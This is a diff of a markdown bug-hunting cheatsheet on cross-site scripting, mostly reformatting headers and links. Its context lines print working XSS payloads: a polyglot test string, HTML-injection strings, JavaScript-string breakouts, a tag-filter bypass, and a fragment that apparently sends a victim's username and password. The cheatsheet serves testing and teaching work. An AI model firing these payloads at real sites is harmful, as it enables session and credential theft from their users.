@@ -1,4 +1,4 @@
-# Testing XSS
+## Testing XSS
 **One Payload For Testing All Kinds of scenario**
 ```
 JavaScript​://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*
@@ -108,7 +108,7 @@ body:username.value+':'+this.value
 **XSS Filter Evasion Cheat Sheet**
 <br>
 https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
-### For html Injection
+## For html Injection
 ```
 <h1>cyborg71</h1>
 "><h1>cyborg71</h1>
@@ -140,7 +140,9 @@ xss';alert(1);'xss
 '-alert(1)-'
 ```
 Finally the code will look like this after response.
-![Screenshot from 2024-06-23 19-29-18](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/5387641e-5ee7-4dca-89a3-e1253a426bc5) <br>
+![Screenshot from 2024-06-23 19-29-18](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/5387641e-5ee7-4dca-89a3-e1253a426bc5)
+<br>
+<br>
 #### Reflected XSS into a JavaScript string with single quote and backslash escaped
 In some scenarios the payload might not work because of single quote and backslash escape.
 ![Screenshot from 2024-07-01 04-27-49](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/af236bde-554a-45f9-8e61-77f4409e5ef4) <br>
@@ -159,10 +161,14 @@ In this case you can try this payload
 \'-alert(1)//
 ```
 And the final code will look like this.
-<br>![Screenshot from 2024-07-01 21-50-00](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/3c75b4b8-173c-4bf7-8c3b-bc87dbc90386)
+<br>
+![Screenshot from 2024-07-01 21-50-00](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/3c75b4b8-173c-4bf7-8c3b-bc87dbc90386)
 ## Tags and Attribute Block Bypass
 **Reflected XSS into HTML context with most tags and attributes blocked**
-https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked. Bruteforce for getting allowed tags.
+<br>
+Bruteforce for getting allowed tags.
+<br>
+Check this Portswigger lab for details: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked.
 ```
 "><body onresize=alert(1337)>
 ```
